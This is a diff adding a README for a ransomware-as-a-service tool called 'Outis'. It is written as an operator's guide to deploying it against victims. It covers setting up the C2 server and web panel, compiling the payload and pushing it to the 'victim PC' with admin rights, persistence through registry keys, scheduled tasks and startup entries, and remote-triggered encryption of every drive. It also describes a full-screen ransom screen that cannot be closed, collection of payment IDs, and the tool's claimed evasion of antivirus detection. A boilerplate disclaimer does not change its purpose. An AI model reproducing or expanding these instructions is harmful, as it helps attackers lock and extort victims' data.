@@ -1,0 +1,64 @@
+
+Outis, A Ransomware as a Service.
+
+Note: USAGE OF THIS TOOL IS TO BE DONE FOR EXPERIMENTAL AND SIMULATION PURPOSES ONLY. ANY HARM MADE DIRECTLY FROM THIS CODE OR POST MODIFICATION WILL NOT MAKE ME RESPONSIBLE. USE AT YOUR DISCRETION, PERMISSION AND AUTHENTICATION.
+
+Usage: 
+
+Setup your HTTP and MySQL Server and import the SQL file as required.
+Setup the htdocs folder exactly as it is or you can customize. Remember, the same changes has to reflect from the python files aswell.
+Default folder hierarchy:
+
+
+htdocs
+    |
+	ransomware
+	|
+	|   conf.php
+	|   delete.php
+	|   edit.php
+	|   index.php
+	|
+	+---API
+	|       conf.php
+	|       get.php
+	|       post.php
+	|       update.php
+	|
+	\---tools
+	        display.exe
+
+
+Files are Fetched, updated, posted in the same manner from the actual codes aswell. Also, the SQL file is setup to run on my server. Customize as you like but make sure to have it reflected from the PHP files aswell.
+
+Once the nessesary changes and modifications are made, compile an exe for the display.py and keep the exe in the tools directory.
+Compile the main.py to exe aswell and that will be later pushed to the victim PC. 
+
+The file needs to run as admin on the victim PC and once it ran successfully, the only changes are need to be done from the Home website. 
+There are 2 options. Password and State. The password would be the Encryption key and the status will be the instruction. (1) for Encrypt (0) for Decrypt (-1) Do Nothing(Default)
+
+
+How it works?
+When first executed, it checks with the C2 if it's registered. If it's not it will upload the system UUID and Hostname with the default values for Password(None) and State of encryption(-1)
+It will setup some registry keys that will work as memory for the code. 
+It will setup a scheduled task to check back every 5 mins (Can be changed from the function: heartbeat)
+It will also setup to run on every startup.
+
+If the C2 doesn't instruct it to run, then nothing ever will happen to the victim PC.
+Once, from the C2 a password is given and status is changed to 1, on the next scheduled task instance, it will start encrypting all the files from all the drives.
+It will download the display.exe from the C2 and run it in full screen without the possibility of closing it.
+It will have a text box to write a transaction ID and that will be uploaded to the C2. If the adversary sees a traction has been made with the same ID, the hacker can change the status back to (0), and on the next instance of the scheduled task, it will start decrypting.
+
+
+By Default a variable called Debug is set to True, which provides detailed explanation of each step it does in the console. If that is turned off, Speed will be better, also nothing will be displayed on screen.
+
+Make sure to compile the EXEs with Proper Window and Console options.
+
+Bugs: Registry memory and Display has some known and possibly unknown bugs. This is the first iteration of upload after first successful test without AV Detection. 
+So Debugs and Changes are possible in the future.
+
+Use with Caution.
+Thank You
+
+
+
